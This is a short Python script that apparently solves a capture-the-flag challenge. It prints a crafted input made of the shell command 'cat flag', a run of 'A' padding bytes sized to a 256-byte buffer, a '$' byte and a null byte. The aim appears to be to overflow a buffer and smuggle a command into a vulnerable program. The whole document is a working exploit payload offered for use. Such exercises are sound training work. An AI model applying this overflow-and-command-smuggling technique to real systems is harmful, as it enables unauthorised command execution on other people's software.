import sys

payload = b"cat flag" + b"A" * (256-11) + b"$" + b"\x00"
sys.stdout.buffer.write(payload)
